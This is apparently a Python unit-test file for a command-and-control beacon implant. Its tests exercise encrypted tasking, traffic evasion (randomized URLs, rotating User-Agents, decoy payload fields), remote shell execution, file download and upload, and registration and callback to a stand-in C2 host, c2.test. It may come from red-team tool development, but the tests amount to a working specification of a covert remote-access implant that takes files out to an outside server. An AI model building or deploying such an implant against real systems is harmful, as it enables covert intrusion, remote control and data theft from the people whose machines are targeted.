#!/usr/bin/env python3
"""
Unit tests for the C2 beacon: encryption, evasion, command execution,
result reporting, and backoff logic.
"""

import base64
import json
import os
import shutil
import sys
import tempfile
import time
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

# Mock dns.resolver before importing beacon (not installed on Windows dev)
if "dns" not in sys.modules:
    _dns_mock = MagicMock()
    sys.modules["dns"] = _dns_mock
    sys.modules["dns.resolver"] = _dns_mock

from cryptography.hazmat.primitives.ciphers.aead import AESGCM


def _make_config(**overrides):
    cfg = {
        "c2": {
            "beacon_interval_seconds": 10,
            "jitter_percent": 20,
            "encryption_key": "",
            "https": {
                "enabled": True,
                "callback_url": "https://c2.test/api/v1/beacon",
                "verify_ssl": False,
            },
            "dns": {
                "enabled": True,
                "domain": "c2.test",
                "resolver": "8.8.8.8",
            },
        }
    }
    cfg["c2"].update(overrides)
    return cfg


class TestEncryption(unittest.TestCase):
    def test_encrypt_decrypt_roundtrip(self):
        from software.c2.beacon import Beacon
        config = _make_config()
        b = Beacon(config)

        data = {"cmd": "shell", "args": "whoami", "id": "task-1"}
        encrypted = b._encrypt(data)
        decrypted = b._decrypt(encrypted)

        self.assertEqual(decrypted, data)

    def test_explicit_key_used(self):
        from software.c2.beacon import Beacon

        key = os.urandom(32)
        key_b64 = base64.b64encode(key).decode()
        config = _make_config(encryption_key=key_b64)
        b = Beacon(config)

        self.assertEqual(b._key, key)

    def test_derived_key_deterministic(self):
        from software.c2.beacon import Beacon

        b1 = Beacon(_make_config())
        b2 = Beacon(_make_config())

        self.assertEqual(b1._key, b2._key)

    def test_different_urls_different_keys(self):
        from software.c2.beacon import Beacon

        c1 = _make_config()
        c2 = _make_config()
        c2["c2"]["https"]["callback_url"] = "https://other.test/beacon"

        b1 = Beacon(c1)
        b2 = Beacon(c2)

        self.assertNotEqual(b1._key, b2._key)

    def test_nonce_uniqueness(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())
        data = {"test": True}

        ct1 = b._encrypt(data)
        ct2 = b._encrypt(data)

        self.assertNotEqual(ct1, ct2)


class TestEvasion(unittest.TestCase):
    def test_evasive_url_randomized(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        urls = {b._evasive_url("beacon") for _ in range(20)}
        self.assertGreater(len(urls), 5)

    def test_evasive_url_contains_endpoint(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())
        url = b._evasive_url("register")
        self.assertIn("register", url)

    def test_evasive_headers_have_required_fields(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())
        headers = b._evasive_headers()

        self.assertIn("User-Agent", headers)
        self.assertIn("Accept", headers)
        self.assertIn("Content-Type", headers)
        self.assertNotEqual(headers["User-Agent"], "CiscoIPPhone/1.0")

    def test_user_agent_rotates(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        uas = {b._evasive_headers()["User-Agent"] for _ in range(50)}
        self.assertGreater(len(uas), 3)

    def test_wrap_payload_has_decoys(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        wrapped = b._wrap_payload({"test": "data"})
        self.assertGreater(len(wrapped), 3)

    def test_wrap_unwrap_roundtrip(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        original = {"cmd": "shell", "args": "id"}
        wrapped = b._wrap_payload(original)
        unwrapped = b._unwrap_response(wrapped)

        self.assertEqual(unwrapped, original)

    def test_payload_field_name_varies(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        from software.c2.beacon import _PAYLOAD_FIELDS
        data = {"test": True}

        fields_used = set()
        for _ in range(50):
            wrapped = b._wrap_payload(data)
            for k in wrapped:
                if k in _PAYLOAD_FIELDS:
                    fields_used.add(k)
        self.assertGreater(len(fields_used), 3)


class TestShellExecution(unittest.TestCase):
    def test_shell_captures_stdout(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        if os.name == "nt":
            output = b._exec_shell("echo hello_world")
        else:
            output = b._exec_shell("echo hello_world")
        self.assertIn("hello_world", output)

    def test_shell_captures_stderr(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        if os.name == "nt":
            output = b._exec_shell("echo error_msg 1>&2")
        else:
            output = b._exec_shell("echo error_msg >&2")
        self.assertIn("error_msg", output)

    def test_shell_timeout(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        if os.name == "nt":
            output = b._exec_shell("ping -n 10 127.0.0.1", timeout=1)
        else:
            output = b._exec_shell("sleep 10", timeout=1)
        self.assertIn("timeout", output.lower())

    def test_shell_nonzero_exit(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        if os.name == "nt":
            output = b._exec_shell("cmd /c exit 42")
        else:
            output = b._exec_shell("exit 42")
        self.assertIn("exit", output.lower())

    def test_output_truncated(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        if os.name == "nt":
            cmd = 'python -c "print(\'A\' * 100000)"'
        else:
            cmd = "python3 -c \"print('A' * 100000)\""
        output = b._exec_shell(cmd)
        self.assertLessEqual(len(output), 65536)


class TestFileOps(unittest.TestCase):
    def test_ls(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        with tempfile.TemporaryDirectory() as tmpdir:
            (Path(tmpdir) / "file1.txt").write_text("hello")
            (Path(tmpdir) / "file2.txt").write_text("world")

            output = b._exec_ls(tmpdir)
            self.assertIn("file1.txt", output)
            self.assertIn("file2.txt", output)

    def test_ls_nonexistent(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())
        output = b._exec_ls("/nonexistent/path/xyz")
        self.assertIn("No such file", output)

    def test_cat(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        with tempfile.TemporaryDirectory() as tmpdir:
            target = Path(tmpdir) / "test.txt"
            target.write_text("test content 12345")
            output = b._exec_cat(str(target))
            self.assertIn("test content 12345", output)

    def test_pwd_and_cd(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        original = os.getcwd()
        tmpdir = tempfile.mkdtemp()
        try:
            pwd = b._exec_pwd()
            self.assertEqual(pwd, original)

            result = b._exec_cd(tmpdir)
            self.assertEqual(os.path.realpath(os.getcwd()), os.path.realpath(result))
        finally:
            os.chdir(original)
            shutil.rmtree(tmpdir, ignore_errors=True)

    def test_mkdir_and_rm(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        with tempfile.TemporaryDirectory() as tmpdir:
            target = os.path.join(tmpdir, "sub", "dir")
            output = b._exec_mkdir(target)
            self.assertIn("Created", output)
            self.assertTrue(Path(target).is_dir())

            output = b._exec_rm(target)
            self.assertIn("Removed", output)
            self.assertFalse(Path(target).exists())

    def test_write_and_cat(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        with tempfile.TemporaryDirectory() as tmpdir:
            target = os.path.join(tmpdir, "test.txt")
            b._exec_write(target, "written content")
            output = b._exec_cat(target)
            self.assertEqual(output, "written content")

    def test_cp(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        with tempfile.TemporaryDirectory() as tmpdir:
            src = Path(tmpdir) / "src.txt"
            dst = Path(tmpdir) / "dst.txt"
            src.write_text("copy me")

            output = b._exec_cp(str(src), str(dst))
            self.assertIn("Copied", output)
            self.assertEqual(dst.read_text(), "copy me")

    def test_mv(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        with tempfile.TemporaryDirectory() as tmpdir:
            src = Path(tmpdir) / "src.txt"
            dst = Path(tmpdir) / "dst.txt"
            src.write_text("move me")

            output = b._exec_mv(str(src), str(dst))
            self.assertIn("Moved", output)
            self.assertFalse(src.exists())
            self.assertEqual(dst.read_text(), "move me")

    def test_download(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        with tempfile.TemporaryDirectory() as tmpdir:
            target = Path(tmpdir) / "test.bin"
            target.write_bytes(b"\x00\x01\x02\x03")
            result = b._exec_download(str(target))
            self.assertEqual(result["size"], 4)
            self.assertEqual(
                base64.b64decode(result["data"]),
                b"\x00\x01\x02\x03",
            )

    def test_upload(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        with tempfile.TemporaryDirectory() as tmpdir:
            target = os.path.join(tmpdir, "uploaded.bin")
            data = base64.b64encode(b"uploaded content").decode()

            output = b._exec_upload(target, data)
            self.assertIn("Uploaded", output)
            self.assertEqual(Path(target).read_bytes(), b"uploaded content")


class TestTaskDispatcher(unittest.TestCase):
    def test_sleep_updates_interval(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())
        b.https_enabled = False

        b._process_tasking({"cmd": "sleep", "args": "60 30"})
        self.assertEqual(b.interval, 60)
        self.assertAlmostEqual(b.jitter, 0.3, places=2)

    def test_kill_stops_beacon(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())
        b._running = True
        b.https_enabled = False

        b._process_tasking({"cmd": "kill"})
        self.assertFalse(b._running)

    def test_shell_executes_command(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())
        b.https_enabled = False

        if os.name == "nt":
            b._process_tasking({"cmd": "shell", "args": "echo dispatcher_test"})
        else:
            b._process_tasking({"cmd": "shell", "args": "echo dispatcher_test"})

    @patch("software.c2.beacon.Beacon._https_post")
    def test_result_sent_back(self, mock_post):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())
        b._agent_id = "test-agent"

        b._process_tasking({
            "id": "task-42",
            "cmd": "pwd",
        })

        mock_post.assert_called()
        call_args = mock_post.call_args
        self.assertEqual(call_args[0][0], "result")
        result_data = call_args[0][1]
        self.assertEqual(result_data["task_id"], "task-42")
        self.assertEqual(result_data["status"], "ok")

    def test_unknown_command_returns_error(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())
        b.https_enabled = False

        b._process_tasking({"cmd": "nonexistent_cmd"})


class TestBackoff(unittest.TestCase):
    @patch("time.sleep")
    def test_backoff_increases_with_failures(self, mock_sleep):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        b._consecutive_failures = 1
        b._backoff_sleep()
        delay_1 = mock_sleep.call_args[0][0]

        mock_sleep.reset_mock()

        b._consecutive_failures = 5
        b._backoff_sleep()
        delay_5 = mock_sleep.call_args[0][0]

        self.assertGreater(delay_5, delay_1)

    @patch("time.sleep")
    def test_backoff_capped_at_300s(self, mock_sleep):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())

        b._consecutive_failures = 100
        b._backoff_sleep()
        delay = mock_sleep.call_args[0][0]

        self.assertLessEqual(delay, 360)  # 300 + 20% jitter max


class TestRegistration(unittest.TestCase):
    @patch("software.c2.beacon.Beacon._https_post")
    def test_successful_registration(self, mock_post):
        from software.c2.beacon import Beacon

        mock_post.return_value = {"success": True, "agent_id": "raccoon-7"}
        b = Beacon(_make_config())

        result = b._register_https()
        self.assertTrue(result)
        self.assertEqual(b._agent_id, "raccoon-7")
        self.assertTrue(b._registered)

    @patch("software.c2.beacon.Beacon._https_post")
    def test_failed_registration(self, mock_post):
        from software.c2.beacon import Beacon

        mock_post.return_value = None
        b = Beacon(_make_config())

        result = b._register_https()
        self.assertFalse(result)
        self.assertFalse(b._registered)


class TestImplantId(unittest.TestCase):
    def test_id_is_deterministic(self):
        from software.c2.beacon import Beacon
        b1 = Beacon(_make_config())
        b2 = Beacon(_make_config())
        self.assertEqual(b1._implant_id, b2._implant_id)

    def test_id_is_16_hex_chars(self):
        from software.c2.beacon import Beacon
        b = Beacon(_make_config())
        self.assertEqual(len(b._implant_id), 16)
        int(b._implant_id, 16)


if __name__ == "__main__":
    unittest.main()
